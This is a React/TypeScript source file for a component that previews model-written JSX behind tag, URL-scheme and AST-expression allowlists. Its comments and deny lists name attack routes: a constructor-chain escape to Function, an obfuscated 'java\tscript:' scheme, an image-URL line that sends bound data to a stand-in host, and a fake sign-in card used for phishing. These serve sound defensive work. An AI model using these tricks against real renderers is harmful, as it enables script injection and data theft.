"use client";

/**
 * Live JSX/TSX renderer with streaming support and error fallback.
 *
 * During streaming, unclosed tags are auto-completed so the parser doesn't
 * choke on partial output. While the current input fails to parse, the last
 * successful render stays on screen.
 *
 * The JSX is untrusted (a model wrote it) and renders inside the host's page,
 * so only an allowlist of presentational HTML and SVG tags renders, URL
 * attributes keep only safe schemes, markup-injecting attributes are dropped,
 * and `{...}` expressions are checked against an allowlist of expression
 * shapes, with no route to a constructor, before anything is evaluated.
 * Components the host passes in `components` are trusted and render as given.
 *
 * What it does not isolate: `style` and `className` are unrestricted, so the
 * JSX can draw over or imitate the host's own UI (a fake sign-in card). That
 * is a phishing surface, not script execution; render previews somewhere a
 * reader can tell apart from the host's chrome. Unknown tags are not rendered.
 *
 * Ported from Vercel AI Elements `JSXPreview` component and adapted for
 * the @flow-state-dev/ui registry conventions.
 */

import type { ComponentType, ReactNode } from "react";

import { cn } from "@/lib/utils";
import { Parser as AcornParser } from "acorn";
import acornJsx from "acorn-jsx";
import { AlertTriangleIcon } from "lucide-react";
import {
  createContext,
  createElement,
  memo,
  useContext,
  useEffect,
  useMemo,
  useReducer,
  useRef,
} from "react";
import JsxParser from "react-jsx-parser";

// ---------------------------------------------------------------------------
// Tag completion for streaming — auto-close unclosed tags
// ---------------------------------------------------------------------------

function completeJsxTag(jsx: string): string {
  const openTags: string[] = [];
  // Match self-closing, opening, and closing tags
  const tagRegex = /<\/?([A-Za-z][A-Za-z0-9.]*)[^>]*\/?>/g;
  let match: RegExpExecArray | null;
  while ((match = tagRegex.exec(jsx)) !== null) {
    const full = match[0];
    const tagName = match[1];
    if (full.startsWith("</")) {
      // closing tag — pop matching open
      const idx = openTags.lastIndexOf(tagName);
      if (idx !== -1) openTags.splice(idx, 1);
    } else if (!full.endsWith("/>")) {
      // opening tag (not self-closing)
      openTags.push(tagName);
    }
  }
  // Close remaining tags in reverse order
  let result = jsx;
  for (let i = openTags.length - 1; i >= 0; i--) {
    result += `</${openTags[i]}>`;
  }
  return result;
}

// ---------------------------------------------------------------------------
// Sanitizing — tag allowlist, URL-scheme allowlist, dropped attributes
// ---------------------------------------------------------------------------

/**
 * The intrinsic tags untrusted JSX may render. Anything else (script, iframe,
 * object, embed, style, link, meta, title, base, form, SVG animation and
 * foreignObject, ...) is not rendered.
 */
const ALLOWED_TAGS = [
  // Text and layout
  "div", "span", "p", "br", "hr", "h1", "h2", "h3", "h4", "h5", "h6",
  "section", "article", "header", "footer", "main", "nav", "aside",
  "a", "b", "strong", "i", "em", "u", "s", "small", "sub", "sup", "mark",
  "code", "pre", "kbd", "samp", "var", "blockquote", "q", "cite", "abbr",
  "time", "address", "del", "ins", "figure", "figcaption", "details", "summary",
  "ul", "ol", "li", "dl", "dt", "dd",
  "table", "caption", "thead", "tbody", "tfoot", "tr", "th", "td", "colgroup", "col",
  "img", "progress", "meter",
  // Controls, without a <form> to submit them
  "button", "label", "input", "select", "option", "optgroup", "textarea", "fieldset", "legend",
  // Static SVG
  "svg", "g", "path", "circle", "ellipse", "line", "polyline", "polygon", "rect",
  "text", "tspan", "defs", "linearGradient", "radialGradient", "stop",
  "clipPath", "mask", "desc",
] as const;

/** Schemes a URL attribute may carry. A URL with no scheme is relative and kept. */
const ALLOWED_URL_SCHEMES = new Set(["http:", "https:", "mailto:", "tel:"]);

/** Attributes (lowercased) whose value is a URL the browser loads or navigates to. */
const URL_ATTRIBUTES = new Set([
  "href", "xlinkhref", "xlink:href", "src", "action", "formaction", "poster", "cite", "background", "ping",
]);

/**
 * Attributes (lowercased) dropped outright: React's raw-HTML escape hatch,
 * a document-in-an-attribute, `form`, which would attach a control to a
 * form elsewhere on the host page, and `srcset`, a list of URLs that a
 * single-URL scheme check would read only the first of.
 */
const DROPPED_ATTRIBUTES = new Set(["dangerouslysetinnerhtml", "srcdoc", "form", "srcset"]);

/** True when a URL is relative or uses an allowed scheme. */
function isSafeUrl(value: unknown): boolean {
  if (typeof value !== "string") return false;
  // Browsers ignore ASCII whitespace and control characters inside a scheme
  // ("java\tscript:"), so strip them before reading it.
  const normalized = value.replace(/[\u0000-\u0020\u007f]/g, "");
  const scheme = /^([a-z][a-z0-9+.-]*:)/i.exec(normalized)?.[1];
  return scheme === undefined || ALLOWED_URL_SCHEMES.has(scheme.toLowerCase());
}

/** The props an untrusted intrinsic element keeps. */
function sanitizeProps(props: Record<string, unknown>): Record<string, unknown> {
  const safe: Record<string, unknown> = {};
  for (const [name, value] of Object.entries(props)) {
    const lower = name.toLowerCase();
    if (lower.startsWith("on") || DROPPED_ATTRIBUTES.has(lower)) continue;
    if (URL_ATTRIBUTES.has(lower) && !isSafeUrl(value)) continue;
    safe[name] = value;
  }
  return safe;
}

/**
 * One component per allowed tag that renders the tag with sanitized props.
 * Rendered under `componentsOnly`, so a tag missing from this map (and from
 * the host's components) is not rendered at all.
 */
const SAFE_INTRINSICS: Record<string, ComponentType<any>> = Object.fromEntries(
  ALLOWED_TAGS.map((tag) => {
    const Safe = (props: Record<string, unknown>) => createElement(tag, sanitizeProps(props));
    Safe.displayName = tag;
    return [tag, Safe];
  }),
);

// ---------------------------------------------------------------------------
// Expression check — an allowlist of expression shapes, no route to a constructor
// ---------------------------------------------------------------------------

/**
 * Property names that walk from a value to its prototype or constructor.
 * The parser evaluates `{...}` expressions, so `"".constructor.constructor`
 * reaches `Function` and `Function("code")()` runs arbitrary script. No
 * globals are in scope, so blocking these names (and property keys computed
 * at runtime, which could spell them) closes that route. This is the second
 * layer; the node-type allowlist below is the first.
 */
const DENIED_NAMES = new Set([
  "constructor", "prototype", "__proto__",
  "__defineGetter__", "__defineSetter__", "__lookupGetter__", "__lookupSetter__",
]);

/**
 * The only AST node types a preview's JSX may contain: the expressions
 * previews use, the JSX around them, and the program wrapper. Anything else
 * (`this`, `new`, tagged templates, optional chaining, assignment,
 * destructuring, function bodies, and any node type a later parser starts
 * evaluating) is refused, so the check fails closed on what it doesn't know.
 */
const ALLOWED_NODE_TYPES = new Set([
  "Program", "ExpressionStatement",
  "Literal", "Identifier", "MemberExpression", "CallExpression", "ArrowFunctionExpression",
  "ConditionalExpression", "LogicalExpression", "BinaryExpression", "UnaryExpression",
  "ArrayExpression", "ObjectExpression", "Property", "SpreadElement", "TemplateLiteral", "TemplateElement",
  "JSXElement", "JSXOpeningElement", "JSXClosingElement", "JSXFragment", "JSXOpeningFragment",
  "JSXClosingFragment", "JSXAttribute", "JSXSpreadAttribute", "JSXIdentifier", "JSXMemberExpression",
  "JSXNamespacedName", "JSXExpressionContainer", "JSXEmptyExpression", "JSXText",
]);

/** Inputs longer than this many characters are refused before they are parsed. */
export const MAX_JSX_LENGTH = 100_000;

/** The void tags the parser self-closes under `autoCloseVoidElements`; mirrored so both parse alike. */
const VOID_TAGS = new Set([
  "area", "base", "br", "col", "embed", "hr", "img", "input", "keygen",
  "link", "menuitem", "meta", "param", "source", "track", "wbr",
]);

const ExpressionCheckParser = AcornParser.extend(
  acornJsx(),
  (Base) =>
    class extends (Base as any) {
      jsx_parseOpeningElementAt(...args: unknown[]) {
        const node = super.jsx_parseOpeningElementAt(...args);
        if (node.name?.type === "JSXIdentifier" && VOID_TAGS.has(node.name.name)) node.selfClosing = true;
        return node;
      }
    } as unknown as typeof AcornParser,
);

/** What makes this one node disallowed, ignoring its children, or null. */
function disallowedNode(n: Record<string, any>): string | null {
  if (!ALLOWED_NODE_TYPES.has(n.type)) return `the expression type "${n.type}"`;
  switch (n.type) {
    case "Identifier":
    case "JSXIdentifier":
      if (DENIED_NAMES.has(n.name)) return `the name "${n.name}"`;
      break;
    case "JSXMemberExpression":
      // A dotted tag resolves through the component map. Only a capitalized
      // member (`Card.Header`) names a sub-component; a lower-case one reaches
      // a function's own fields, and `div.displayName` is the string "div",
      // which would render a raw intrinsic with unsanitized props.
      if (!/^[A-Z]/.test(n.property.name)) return `the tag member "${n.property.name}"`;
      break;
    case "MemberExpression":
      if (!n.computed) break; // the property is an Identifier, checked as a child
      // Only a literal index: a key computed at runtime could spell a denied name.
      if (n.property.type !== "Literal" || !["string", "number"].includes(typeof n.property.value)) {
        return "a property key computed at runtime";
      }
      if (DENIED_NAMES.has(String(n.property.value))) return `the property "${n.property.value}"`;
      break;
    case "Property": {
      // Computed keys (`{ [k]: v }`) are refused outright: the key is only known at runtime.
      if (n.computed || n.kind !== "init" || n.method) return "that object key";
      if (DENIED_NAMES.has(String(n.key.name ?? n.key.value))) return "that object key";
      break;
    }
    case "ArrowFunctionExpression":
      if (n.async || n.generator) return "an async or generator function";
      if (!n.params.every((p: { type: string }) => p.type === "Identifier")) return "a destructuring or default parameter";
      break;
  }
  return null;
}

/** The first node in `node`'s tree that is not allowed, described, or null. */
function findDisallowed(node: unknown): string | null {
  if (Array.isArray(node)) {
    for (const child of node) {
      const found = findDisallowed(child);
      if (found) return found;
    }
    return null;
  }
  // Only AST nodes carry a string `type`; other objects (a regex literal's
  // pattern, a template element's text) hold no nodes.
  if (!node || typeof node !== "object" || typeof (node as { type?: unknown }).type !== "string") return null;
  const n = node as Record<string, any>;
  const own = disallowedNode(n);
  if (own) return own;
  for (const [field, child] of Object.entries(n)) {
    if (field === "type" || field === "loc" || field === "start" || field === "end") continue;
    const found = findDisallowed(child);
    if (found) return found;
  }
  return null;
}

/**
 * Parse `jsx` the way react-jsx-parser will (trimmed, DOCTYPEs stripped,
 * wrapped in `<root>`, void tags self-closed) and return why it may not be
 * rendered, or null. Fails closed: input this parser cannot read is refused,
 * so the renderer never evaluates an expression unchecked.
 */
export function checkExpressions(jsx: string): Error | null {
  if (jsx.length > MAX_JSX_LENGTH) {
    return new Error(`The JSX is longer than ${MAX_JSX_LENGTH} characters, which is too long for a preview.`);
  }
  // react-jsx-parser's render() applies exactly this before parsing.
  const source = jsx.trim().replace(/<!DOCTYPE([^>]*)>/g, "");
  try {
    const ast = ExpressionCheckParser.parse(`<root>${source}</root>`, { ecmaVersion: "latest" });
    const denied = findDisallowed(ast);
    return denied ? new Error(`The JSX uses ${denied}, which is not allowed in a preview.`) : null;
  } catch (err) {
    return err instanceof Error ? err : new Error(String(err));
  }
}

// ---------------------------------------------------------------------------
// Parsing — a pure function of the input
// ---------------------------------------------------------------------------

interface ParseResult {
  nodes: ReactNode;
  error: Error | null;
}

/**
 * Parse and render `jsx` to React nodes, synchronously.
 *
 * Runs the parser's own `render()` outside a React render so the result and
 * any parse error can be derived with `useMemo`. The parser reports errors
 * through callbacks invoked while it renders; turning those into state from
 * inside its render is a state update during another component's render.
 */
function parseJsx(
  jsx: string,
  components: Record<string, ComponentType<any>>,
  bindings: Record<string, unknown>,
): ParseResult {
  // Checked as the parser will read it; see checkExpressions.
  const denied = checkExpressions(jsx);
  if (denied) return { nodes: null, error: denied };

  let error: Error | null = null;
  const parser = new JsxParser({
    ...JsxParser.defaultProps,
    jsx,
    // Host components win over the allowlist: the host chose them. No
    // prototype, so a tag named `constructor` or `toString` resolves to nothing.
    components: Object.assign(Object.create(null), SAFE_INTRINSICS, components),
    bindings,
    componentsOnly: true,
    renderInWrapper: false,
    autoCloseVoidElements: true,
    renderError: ({ error: message }: { error: string }) => {
      error = new Error(message);
      return null;
    },
  });
  const nodes = parser.render() as ReactNode;
  return { nodes: error ? null : nodes, error };
}

// ---------------------------------------------------------------------------
// Context
// ---------------------------------------------------------------------------

interface JSXPreviewContextType {
  /** What to show: the current render, or the last good one while the input fails to parse. */
  nodes: ReactNode;
  /** True when there is no JSX to render. */
  isEmpty: boolean;
  error: Error | null;
}

const JSXPreviewContext = createContext<JSXPreviewContextType>({
  nodes: null,
  isEmpty: true,
  error: null,
});

// ---------------------------------------------------------------------------
// JSXPreview — root provider
// ---------------------------------------------------------------------------

export interface JSXPreviewProps {
  /** Raw JSX/TSX string to render. */
  jsx: string;
  /** Whether JSX is still being streamed (enables tag auto-completion). */
  isStreaming?: boolean;
  /** Map of component names available inside the JSX. Trusted: rendered as given. */
  components?: Record<string, ComponentType<any>>;
  /**
   * Map of variable bindings available inside the JSX. Trusted data, but the
   * JSX can read all of it and send it out (`<img src={"https://x/?" + v} />`),
   * so bind only what the preview may show.
   */
  bindings?: Record<string, unknown>;
  /** Called once per distinct parse or guard error, after commit. */
  onError?: (error: Error) => void;
  children?: ReactNode;
  className?: string;
}

const NO_COMPONENTS: Record<string, ComponentType<any>> = {};
const NO_BINDINGS: Record<string, unknown> = {};

/** The result last shown, and the nodes on screen for it. */
interface Shown {
  result: ParseResult | null;
  nodes: ReactNode;
}

const INITIAL_SHOWN: Shown = { result: null, nodes: null };

/** Show a new result, keeping the previous nodes while it is an error. */
function showResult(prev: Shown, result: ParseResult): Shown {
  return { result, nodes: result.error ? prev.nodes : result.nodes };
}

export function JSXPreview({
  jsx,
  isStreaming = false,
  components = NO_COMPONENTS,
  bindings = NO_BINDINGS,
  onError,
  children,
  className,
}: JSXPreviewProps) {
  const completedJsx = useMemo(
    () => (isStreaming ? completeJsxTag(jsx) : jsx),
    [jsx, isStreaming],
  );
  const isEmpty = !completedJsx.trim();

  const result = useMemo<ParseResult>(
    () => (isEmpty ? { nodes: null, error: null } : parseJsx(completedJsx, components, bindings)),
    [isEmpty, completedJsx, components, bindings],
  );

  // What to show: the current render, or the last one that parsed while the
  // current input fails. That is history, not derivable from the current
  // props, so it is state, advanced during render whenever the result changes
  // (React re-runs this render with the new state before committing).
  const [shown, show] = useReducer(showResult, INITIAL_SHOWN);
  if (shown.result !== result) show(result);
  const nodes = shown.nodes;

  // Notifies the host of a new parse error: a call out of the component, so
  // it runs after commit. The handler is read through a ref because hosts
  // usually pass an inline one, a new function every render; depending on it
  // would notify on every host render, and a handler that sets host state
  // would loop. Deduped by message, because inline `bindings` or `components`
  // re-derive an equal error on every host render too.
  const onErrorRef = useRef(onError);
  useEffect(() => {
    onErrorRef.current = onError;
  }, [onError]);
  const reportedRef = useRef<string | null>(null);
  useEffect(() => {
    const message = result.error?.message ?? null;
    if (result.error && message !== reportedRef.current) onErrorRef.current?.(result.error);
    reportedRef.current = message;
  }, [result.error]);

  const ctx = useMemo(
    () => ({ nodes, isEmpty, error: result.error }),
    [nodes, isEmpty, result.error],
  );

  return (
    <JSXPreviewContext.Provider value={ctx}>
      <div className={cn("relative", className)}>{children}</div>
    </JSXPreviewContext.Provider>
  );
}

// ---------------------------------------------------------------------------
// JSXPreviewContent — renders the parsed nodes
// ---------------------------------------------------------------------------

export const JSXPreviewContent = memo(function JSXPreviewContent({
  className,
}: {
  className?: string;
}) {
  const { nodes, isEmpty } = useContext(JSXPreviewContext);

  if (isEmpty) {
    return (
      <div className={cn("p-4 text-sm text-muted-foreground", className)}>
        No JSX content to preview.
      </div>
    );
  }

  return <div className={cn("p-4", className)}>{nodes}</div>;
});

// ---------------------------------------------------------------------------
// JSXPreviewError — conditional error display
// ---------------------------------------------------------------------------

export function JSXPreviewError({
  className,
  children,
}: {
  className?: string;
  children?: (error: Error) => ReactNode;
}) {
  const { error } = useContext(JSXPreviewContext);

  if (!error) return null;

  if (children) {
    return <>{children(error)}</>;
  }

  return (
    <div
      className={cn(
        "flex items-start gap-2 border-t border-destructive/20 bg-destructive/5 px-4 py-2 text-xs text-destructive",
        className,
      )}
    >
      <AlertTriangleIcon className="mt-0.5 h-3.5 w-3.5 shrink-0" />
      <span>{error.message}</span>
    </div>
  );
}
